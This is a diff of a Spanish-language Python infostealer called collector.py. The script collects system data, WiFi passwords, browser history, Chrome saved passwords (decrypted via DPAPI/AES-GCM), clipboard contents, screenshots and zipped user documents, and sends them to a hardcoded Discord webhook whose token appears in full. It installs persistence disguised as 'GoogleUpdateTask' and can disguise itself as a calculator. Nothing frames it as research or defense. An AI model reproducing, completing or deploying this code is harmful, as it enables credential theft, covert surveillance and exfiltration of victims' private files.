@@ -3,6 +3,15 @@
 """
 collector.py - Recolector multiplataforma + envio a webhook de Discord.
 Windows / Linux / macOS / Android (Kivy-Buildozer o Termux).
+
+Uso:
+    python collector.py                # recolecta y envia
+    python collector.py --test         # solo manda un ping al webhook
+    python collector.py --debug        # imprime el informe por consola
+    python collector.py --json out.json
+    python collector.py --grab         # adjunta documentos del usuario (zip)
+    python collector.py --install      # persistencia (Run / autostart)
+    python collector.py --gui          # se disfraza de calculadora
 """
 from __future__ import annotations
 
@@ -11,21 +20,25 @@ import shutil, socket, sqlite3, subprocess, sys, tempfile, time, traceback
 import uuid, zipfile
 from pathlib import Path
 
-# ---------------- CONFIG ----------------
+# ----------------------------------------------------------------------------
+# CONFIG  (el webhook ya va incrustado)
+# ----------------------------------------------------------------------------
+DEFAULT_WEBHOOK = ("https://discord.com/api/webhooks/1562815752652718111/"
+                   "5Dhc847naUwAIZi9B3efa3TFZWtYZiiCEU6Vq3KJrAdCyuS1OVQDN6ZXV0bYQg8-88F2")
+
 try:
-    from _secret import WEBHOOK_URL as _SW      # inyectado por el workflow
+    from _secret import WEBHOOK_URL as _SW          # opcional, lo escribe el CI
 except Exception:
     _SW = ""
 
-WEBHOOK_URL = (os.environ.get("WEBHOOK_URL") or _SW
-               or "https://discord.com/api/webhooks/PON_TU_WEBHOOK")
+WEBHOOK_URL = (os.environ.get("WEBHOOK_URL") or _SW or DEFAULT_WEBHOOK)
 WEBHOOKS = [u.strip() for u in WEBHOOK_URL.split(",") if u.strip().startswith("http")]
 
-BOT_NAME          = os.environ.get("BOT_NAME", "sysinfo")
-MAX_EMBEDS_MSG    = 10
-MAX_FIELDS_EMBED  = 25
-FIELD_LIMIT       = 1020
-ATTACH_MAX        = 7 * 1024 * 1024
+BOT_NAME         = os.environ.get("BOT_NAME", "sysinfo")
+MAX_EMBEDS_MSG   = 10
+MAX_FIELDS_EMBED = 25
+FIELD_LIMIT      = 1020
+ATTACH_MAX       = 7 * 1024 * 1024
 
 try:
     import requests
@@ -37,8 +50,11 @@ except Exception:
     psutil = None
 
 SKIP = set()
+ANDROID = "ANDROID_ARGUMENT" in os.environ or "ANDROID_ROOT" in os.environ
 
-# ---------------- HELPERS ----------------
+# ----------------------------------------------------------------------------
+# HELPERS
+# ----------------------------------------------------------------------------
 def _run(cmd, timeout=12):
     try:
         p = subprocess.run(cmd, shell=True, capture_output=True, text=True,
@@ -51,6 +67,33 @@ def _trunc(s, n=FIELD_LIMIT):
     s = str(s)
     return s if len(s) <= n else s[: n - 3] + "..."
 
+def _home() -> Path:
+    try:
+        return Path.home()
+    except Exception:
+        return Path("/")
+
+def _roots_usuario():
+    """Carpetas de usuario reales (incluye /sdcard en Android)."""
+    roots, home = [], _home()
+    for n in ("Desktop", "Escritorio", "Documents", "Documentos",
+              "Downloads", "Descargas", "Pictures", "Imagenes"):
+        p = home / n
+        if p.exists():
+            roots.append(p)
+    if platform.system() == "Linux":
+        for extra in ("/sdcard/Download", "/sdcard/Documents", "/sdcard/DCIM",
+                      "/storage/emulated/0/Download", "/storage/emulated/0/Documents"):
+            p = Path(extra)
+            if p.exists():
+                roots.append(p)
+    vistos, out = set(), []
+    for r in roots:
+        k = str(r)
+        if k not in vistos:
+            vistos.add(k); out.append(r)
+    return out
+
 _SECTIONS = []
 def section(titulo):
     def deco(fn):
@@ -58,13 +101,15 @@ def section(titulo):
         return fn
     return deco
 
-# ---------------- RECOLECTORES ----------------
+# ----------------------------------------------------------------------------
+# RECOLECTORES
+# ----------------------------------------------------------------------------
 @section("Sistema")
 def sec_sistema():
     mac = ":".join(f"{(uuid.getnode() >> i) & 0xff:02x}" for i in range(0, 48, 8))
     return {
         "hostname": socket.gethostname(),
-        "usuario": getpass.getuser(),
+        "usuario": getpass.getuser() or "n/d",
         "SO": f"{platform.system()} {platform.release()}",
         "build": platform.version(),
         "arquitectura": platform.machine(),
@@ -96,32 +141,36 @@ def _uptime():
 def sec_hardware():
     d = {}
     if psutil:
-        d["cpu_logicos"] = str(psutil.cpu_count(logical=True))
-        d["cpu_fisicos"] = str(psutil.cpu_count(logical=False))
-        d["cpu_uso_%"] = f"{psutil.cpu_percent(interval=0.6)}"
         try:
-            d["cpu_freq_mhz"] = str(int(psutil.cpu_freq().current))
+            d["cpu_logicos"] = str(psutil.cpu_count(logical=True))
+            d["cpu_fisicos"] = str(psutil.cpu_count(logical=False))
+            d["cpu_uso_%"] = f"{psutil.cpu_percent(interval=0.6)}"
+            try:
+                d["cpu_freq_mhz"] = str(int(psutil.cpu_freq().current))
+            except Exception:
+                pass
+            vm = psutil.virtual_memory()
+            d["ram_total_GB"] = f"{vm.total / 1e9:.2f}"
+            d["ram_usada_%"] = f"{vm.percent}"
+            d["swap_GB"] = f"{psutil.swap_memory().total / 1e9:.2f}"
+            b = getattr(psutil, "sensors_battery", lambda: None)()
+            if b:
+                d["bateria"] = f"{b.percent}% {'cargando' if b.power_plugged else 'descargando'}"
         except Exception:
             pass
-        vm = psutil.virtual_memory()
-        d["ram_total_GB"] = f"{vm.total/1e9:.2f}"
-        d["ram_usada_%"] = f"{vm.percent}"
-        d["swap_GB"] = f"{psutil.swap_memory().total/1e9:.2f}"
-        b = getattr(psutil, "sensors_battery", lambda: None)()
-        if b:
-            d["bateria"] = f"{b.percent}% {'cargando' if b.power_plugged else 'descargando'}"
     discos = []
     if psutil:
         for p in psutil.disk_partitions(all=False):
             try:
                 u = psutil.disk_usage(p.mountpoint)
-                discos.append(f"{p.device} [{p.fstype}] {u.used/1e9:.1f}/{u.total/1e9:.1f} GB ({u.percent}%)")
+                discos.append(f"{p.device} [{p.fstype}] {u.used / 1e9:.1f}/"
+                              f"{u.total / 1e9:.1f} GB ({u.percent}%)")
             except Exception:
                 pass
     d["discos"] = "\n".join(discos[:10]) or "n/d"
     if platform.system() == "Windows":
-        d["gpu"] = _run("wmic path win32_VideoController get name", 20)
-        d["placa_base"] = _run("wmic baseboard get product,manufacturer", 20)
+        d["gpu"] = _run("wmic path win32_VideoController get name", 25)
+        d["placa_base"] = _run("wmic baseboard get product,manufacturer", 25)
     else:
         d["gpu"] = _run("lspci | grep -i 'vga\\|3d'") or "n/d"
     return d
@@ -173,7 +222,7 @@ def sec_procesos():
             mi = p.info["memory_info"]
             procs.append((mi.rss if mi else 0,
                           f'{p.info["pid"]} | {p.info["name"]} | '
-                          f'{(mi.rss/1048576 if mi else 0):.0f}MB | {p.info["username"]}'))
+                          f'{(mi.rss / 1048576 if mi else 0):.0f}MB | {p.info["username"]}'))
         except Exception:
             pass
     procs.sort(reverse=True)
@@ -191,11 +240,12 @@ def sec_programas():
                    'Select-Object DisplayName,DisplayVersion | Where-Object {$_.DisplayName} | '
                    'Sort-Object DisplayName | Format-Table -HideTableHeaders"', 60)
     elif so == "Linux":
-        txt = _run("dpkg-query -W -f='${Package} ${Version}\\n' 2>/dev/null | head -250") \
-              or _run("rpm -qa | head -250")
+        txt = (_run("dpkg-query -W -f='${Package} ${Version}\\n' 2>/dev/null | head -250")
+               or _run("rpm -qa | head -250")
+               or _run("pm list packages | head -250"))
     else:
         txt = _run("brew list --versions | head -250")
-    return {"resumen": txt[:1000], "completo": txt[:4000]}
+    return {"resumen": txt[:1000] or "n/d", "completo": txt[:4000] or "n/d"}
 
 @section("WiFi")
 def sec_wifi():
@@ -209,7 +259,10 @@ def sec_wifi():
             m = re.search(r"(?:Contenido de la clave|Key Content)\s*:\s*(.+)", info)
             lineas.append(f"{p} | {m.group(1).strip() if m else 'sin clave'}")
         return {"perfiles_con_clave": "\n".join(lineas) or "n/d"}
-    return {"perfiles": (_run("nmcli -t -f NAME,TYPE device connection show") or "n/d")[:1000]}
+    txt = _run("nmcli -t -f NAME,TYPE device connection show") or _run("iwconfig")
+    if not txt and ANDROID:
+        txt = _run("dumpsys wifi | head -40")
+    return {"perfiles": (txt or "n/d")[:1000]}
 
 def _chrome_history(hist: Path, limit=15):
     try:
@@ -224,7 +277,7 @@ def _chrome_history(hist: Path, limit=15):
 
 def _firefox_history(limit=15):
     try:
-        pl = sorted(glob.glob(str(Path.home() / ".mozilla/firefox/*/places.sqlite")),
+        pl = sorted(glob.glob(str(_home() / ".mozilla/firefox/*/places.sqlite")),
                     key=os.path.getmtime, reverse=True)
         if not pl:
             return ""
@@ -238,7 +291,7 @@ def _firefox_history(limit=15):
 
 @section("Navegadores")
 def sec_navegadores():
-    home = Path.home()
+    home = _home()
     perfiles = {
         "Chrome":   home / "AppData/Local/Google/Chrome/User Data/Default",
         "Edge":     home / "AppData/Local/Microsoft/Edge/User Data/Default",
@@ -263,22 +316,27 @@ def _chrome_passwords(profile: Path, limit=12):
     """Windows: DPAPI + AES-GCM sobre 'Login Data'."""
     db = profile / "Login Data"
     ls = profile.parent / "Local State"
-    if not db.exists() or not ls.exists():
+    if not db.exists() or not ls.exists() or platform.system() != "Windows":
         return ""
     try:
         import ctypes
         from ctypes import wintypes
+
         class BLOB(ctypes.Structure):
-            _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
+            _fields_ = [("cbData", wintypes.DWORD),
+                        ("pbData", ctypes.POINTER(ctypes.c_char))]
+
         def dpapi(enc):
             buf = ctypes.create_string_buffer(enc, len(enc))
             bi = BLOB(len(enc), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
             bo = BLOB()
-            if not ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(bi), None, None,
-                                                            None, None, 0, ctypes.byref(bo)):
+            if not ctypes.windll.crypt32.CryptUnprotectData(
+                    ctypes.byref(bi), None, None, None, None, 0, ctypes.byref(bo)):
                 raise OSError("dpapi fail")
             return ctypes.string_at(bo.pbData, bo.cbData)
-        key = base64.b64decode(json.loads(ls.read_text(encoding="utf-8"))["os_crypt"]["encrypted_key"])[5:]
+
+        key = base64.b64decode(
+            json.loads(ls.read_text(encoding="utf-8"))["os_crypt"]["encrypted_key"])[5:]
         key = dpapi(key)
         from cryptography.hazmat.primitives.ciphers.aead import AESGCM
         aes = AESGCM(key)
@@ -303,23 +361,14 @@ def _chrome_passwords(profile: Path, limit=12):
 
 @section("Archivos recientes")
 def sec_archivos():
-    home = Path.home()
     d = {}
-    for nombre in ["Desktop", "Escritorio", "Documents", "Documentos", "Downloads", "Descargas"]:
-        p = home / nombre
-        if p.exists():
-            try:
-                items = sorted(p.iterdir(), key=lambda x: -x.stat().st_mtime)[:20]
-                d[nombre] = "\n".join(f"{i.name}{'/' if i.is_dir() else ''}" for i in items) or "(vacia)"
-            except Exception as e:
-                d[nombre] = str(e)
-    for extra in ["/sdcard", "/sdcard/Download", "/sdcard/DCIM"]:
-        p = Path(extra)
-        if p.exists():
-            try:
-                d[extra] = "\n".join(x.name for x in list(p.iterdir())[:20])
-            except Exception:
-                pass
+    for root in _roots_usuario():
+        try:
+            items = sorted(root.iterdir(), key=lambda x: -x.stat().st_mtime)[:20]
+            d[root.name] = "\n".join(f"{i.name}{'/' if i.is_dir() else ''}"
+                                     for i in items) or "(vacia)"
+        except Exception as e:
+            d[root.name] = str(e)
     return d
 
 @section("Tareas y arranque")
@@ -331,36 +380,44 @@ def sec_tareas():
                                    "? {$_.StartType -eq 'Automatic'} | Select -First 30 -Expand Name\"", 30)
     else:
         d["crontab"] = (_run("crontab -l 2>/dev/null") or "(vacio)")[:900]
-        d["autostart"] = "\n".join(p.name for p in Path.home().glob(".config/autostart/*.desktop")) or "(vacio)"
+        d["autostart"] = "\n".join(p.name for p in _home().glob(".config/autostart/*.desktop")) or "(vacio)"
     return d
 
 @section("Portapapeles")
 def sec_clipboard():
-    try:
-        import tkinter
-        r = tkinter.Tk(); r.withdraw()
-        t = r.clipboard_get(); r.destroy()
-        return {"contenido": t[:800]}
-    except Exception:
-        pass
+    if not ANDROID:
+        try:
+            import tkinter
+            r = tkinter.Tk(); r.withdraw()
+            t = r.clipboard_get(); r.destroy()
+            if t:
+                return {"contenido": t[:800]}
+        except Exception:
+            pass
     for cmd in ("powershell -NoProfile -Command Get-Clipboard",
-                "xclip -o -selection clipboard", "pbpaste"):
-        out = _run(cmd)
+                "xclip -o -selection clipboard", "pbpaste",
+                "termux-clipboard-get"):
+        out = _run(cmd, 8)
         if out:
             return {"contenido": out[:800]}
     return {"contenido": "n/d"}
 
-# ---------------- CAPTURA ----------------
+# ----------------------------------------------------------------------------
+# CAPTURA
+# ----------------------------------------------------------------------------
 def _screenshot(destino: Path) -> bool:
     try:
         from PIL import ImageGrab
         ImageGrab.grab().save(destino)
-        return destino.exists()
+        if destino.exists() and destino.stat().st_size > 0:
+            return True
     except Exception:
         pass
-    for cmd in (f"import -window root {destino}", f"scrot {destino}",
-                f"gnome-screenshot -f {destino}", f"screencap -p {destino}"):
-        if _run(cmd) and destino.exists():
+    for cmd in (f"screencap -p {destino}",
+                f"import -window root {destino}",
+                f"scrot {destino}",
+                f"gnome-screenshot -f {destino}"):
+        if _run(cmd, 20) and destino.exists() and destino.stat().st_size > 0:
             return True
     return False
 
@@ -368,23 +425,18 @@ DOC_EXT = {".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
            ".txt", ".csv", ".json", ".jpg", ".jpeg", ".png", ".zip", ".rar"}
 
 def grab_docs(max_bytes=18 * 1024 * 1024):
-    home = Path.home()
-    roots = [home / n for n in ("Desktop", "Escritorio", "Documents", "Documentos",
-                                "Downloads", "Descargas")]
     out = Path(tempfile.mkdtemp()) / "docs.zip"
     total = 0
     try:
         with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
-            for root in roots:
-                if not root.exists():
-                    continue
+            for root in _roots_usuario():
                 for f in root.rglob("*"):
                     try:
                         if not f.is_file() or f.suffix.lower() not in DOC_EXT:
                             continue
                         if f.stat().st_size > 4 * 1024 * 1024 or total > max_bytes:
                             continue
-                        z.write(f, str(f.relative_to(home)))
+                        z.write(f, str(f.name))
                         total += f.stat().st_size
                     except Exception:
                         continue
@@ -392,7 +444,9 @@ def grab_docs(max_bytes=18 * 1024 * 1024):
         return None
     return out if out.exists() and out.stat().st_size > 200 else None
 
-# ---------------- RECOLECCION ----------------
+# ----------------------------------------------------------------------------
+# RECOLECCION
+# ----------------------------------------------------------------------------
 def run_collection() -> dict:
     data, errores = {}, {}
     for titulo, fn in _SECTIONS:
@@ -406,7 +460,9 @@ def run_collection() -> dict:
         data["Errores de recoleccion"] = errores
     return data
 
-# ---------------- ENVIO ----------------
+# ----------------------------------------------------------------------------
+# ENVIO
+# ----------------------------------------------------------------------------
 def _post(url, payload=None, files=None, timeout=90):
     if requests is None:
         return False
@@ -446,12 +502,18 @@ def build_embeds(data: dict):
     return embeds
 
 def send_report(data: dict, screen: Path | None = None, zipfile_: Path | None = None,
-                dump: Path | None = None):
+                dump: Path | None = None) -> bool:
+    if not WEBHOOKS:
+        print("[!] No hay webhook configurado"); return False
+    if requests is None:
+        print("[!] Falta el modulo 'requests'"); return False
+
+    ok = False
     embeds = build_embeds(data)
     for i in range(0, len(embeds), MAX_EMBEDS_MSG):
         payload = {"username": BOT_NAME, "embeds": embeds[i:i + MAX_EMBEDS_MSG]}
         for u in WEBHOOKS:
-            _post(u, payload)
+            ok = _post(u, payload) or ok
 
     for ruta, caption, ctype in ((screen, "Captura de pantalla", "image/png"),
                                  (dump, "Volcado JSON completo", "application/json"),
@@ -459,10 +521,21 @@ def send_report(data: dict, screen: Path | None = None, zipfile_: Path | None = 
         if ruta and Path(ruta).exists() and Path(ruta).stat().st_size < ATTACH_MAX:
             for u in WEBHOOKS:
                 with open(ruta, "rb") as fh:
-                    _post(u, {"username": BOT_NAME, "content": caption},
-                          files={"file": (Path(ruta).name, fh, ctype)})
+                    ok = _post(u, {"username": BOT_NAME, "content": caption},
+                               files={"file": (Path(ruta).name, fh, ctype)}) or ok
+    return ok
 
-# ---------------- PERSISTENCIA ----------------
+def test_webhook() -> bool:
+    msg = (f"Conectado desde **{socket.gethostname()}** "
+           f"({platform.system()} {platform.release()} / {platform.machine()})")
+    r = False
+    for u in WEBHOOKS:
+        r = _post(u, {"username": BOT_NAME, "content": msg}) or r
+    return r
+
+# ----------------------------------------------------------------------------
+# PERSISTENCIA
+# ----------------------------------------------------------------------------
 def install_persistence():
     exe = sys.executable
     cmd = f'"{exe}"' if getattr(sys, "frozen", False) else f'"{exe}" "{Path(__file__).resolve()}"'
@@ -475,14 +548,16 @@ def install_persistence():
             winreg.SetValueEx(k, "GoogleUpdateTask", 0, winreg.REG_SZ, cmd)
             winreg.CloseKey(k)
         elif platform.system() == "Linux":
-            ad = Path.home() / ".config/autostart"; ad.mkdir(parents=True, exist_ok=True)
+            ad = _home() / ".config/autostart"; ad.mkdir(parents=True, exist_ok=True)
             (ad / "gupdate.desktop").write_text(
                 "[Desktop Entry]\nType=Application\nName=GoogleUpdateTask\n"
                 f"Exec={cmd}\nX-GNOME-Autostart-enabled=true\n", encoding="utf-8")
     except Exception:
         pass
 
-# ---------------- MAIN ----------------
+# ----------------------------------------------------------------------------
+# MAIN
+# ----------------------------------------------------------------------------
 def main():
     ap = argparse.ArgumentParser()
     ap.add_argument("--json"); ap.add_argument("--delay", type=int, default=0)
@@ -491,11 +566,18 @@ def main():
     ap.add_argument("--grab", action="store_true")
     ap.add_argument("--install", action="store_true")
     ap.add_argument("--gui", action="store_true")
+    ap.add_argument("--test", action="store_true")
+    ap.add_argument("--debug", action="store_true")
     a = ap.parse_args()
 
-    if a.no_env:   SKIP.add("env")
-    if a.install:  install_persistence(); return
-    if a.delay:    time.sleep(a.delay)
+    if a.no_env:
+        SKIP.add("env")
+    if a.install:
+        install_persistence(); return
+    if a.test:
+        print("[+] Webhook OK" if test_webhook() else "[!] Webhook FALLO"); return
+    if a.delay:
+        time.sleep(a.delay)
     if a.gui:
         import camuflaje; camuflaje.run(); return
 
@@ -514,8 +596,11 @@ def main():
     z = grab_docs() if a.grab else None
     if a.json:
         Path(a.json).write_text(dump.read_text(encoding="utf-8"), encoding="utf-8")
+    if a.debug:
+        print(json.dumps(data, ensure_ascii=False, indent=2)[:4000])
 
-    send_report(data, screen, z, dump)
+    ok = send_report(data, screen, z, dump)
+    print("[+] Enviado" if ok else "[!] Fallo al enviar")
 
 if __name__ == "__main__":
     try:
